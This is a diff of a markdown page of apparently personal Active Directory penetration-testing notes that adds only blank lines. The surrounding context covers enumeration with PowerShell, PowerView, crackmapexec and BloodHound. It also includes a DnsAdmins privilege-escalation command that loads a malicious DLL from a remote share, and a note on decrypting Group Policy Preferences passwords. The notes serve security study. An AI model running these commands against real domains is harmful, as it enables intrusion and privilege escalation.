@@ -5,6 +5,7 @@ layout: blank
 AD Cheat Sheet - https://wadcoms.github.io/#
 
 AD mindmap - https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
+
 ### AD Intro
 - Organizational Units (OUs)
 	- Basically categories for group policy settings and permissions
@@ -13,6 +14,7 @@ AD mindmap - https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_d
 - When using xfreerdp, use `/d:` for domain name
 
 ### Manual Enumeration
+
 **User Enumeration**
 - If something reveals the names of employees, use this to guess at usernames. Can try to see if each user doesn't have preauth
 **Enumeration using Windows Tools**
@@ -54,6 +56,7 @@ AD mindmap - https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_d
 		- Dns Admins
 			- Can perform dll hijacking to priv esc
 			- `dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll`
+
 **Enumeration with PowerShell and .NET Classes**
 - LDAP is the communication channel that AD uses to query things
 	- If a domain machine searches for a printer, the search query uses LDAP
@@ -114,6 +117,7 @@ function LDAPSearch {
 	- `foreach ($group in $(LDAPSearch -q "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member}}`
 		- Just basically shows the CN and members for each group 
 		- This will additionally show nested groups, which `net.exe` doesn't
+
 ### Enumeration with PowerView
 - https://powersploit.readthedocs.io/en/latest/Recon/
 - https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
@@ -145,6 +149,7 @@ function LDAPSearch {
 		- Look for interesting shares, like NETLOGON, SYSVOL, backups, docshares, or tools
 		- Can view internals using `ls \\{domain}\{share}` and read files with `cat`
 			- Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with `gpp-decrypt`
+
 ### Manual Enumeration
 - `PsLoggedOn.exe` - uses Remote Registry service to enumerate registry keys to see who's logged on to a system
 	- Not enabled by default on workstations since Windows 8, but it enabled by default on servers like 2012, 2016, 2019, and 2022
@@ -171,8 +176,10 @@ function LDAPSearch {
 		- `crackmapexec smb {IP} -u {username} -p {password} --all`
 
 ### Automatic Enumeration
+
 **Enum4Linux**
 - Just run `enum4linux {IP}`
+
 **BloodHound/SharpHound**
 - Capturing the system data with BloodHound:
 	- [SharpHound](https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1)
